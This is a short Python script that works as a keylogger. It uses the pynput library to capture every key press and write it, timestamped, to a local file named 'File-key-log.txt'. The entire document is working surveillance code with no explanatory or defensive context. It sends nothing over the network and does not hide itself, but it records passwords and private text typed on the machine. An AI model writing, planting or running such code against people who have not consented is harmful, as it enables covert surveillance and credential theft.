from pynput.keyboard import Key, Listener
import logging
lgd="File-"
logging.basicConfig(filename=(lgd + "key-log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def key_press(k):
    logging.info(str(k))

with Listener(on_press=key_press) as listener:
    listener.join()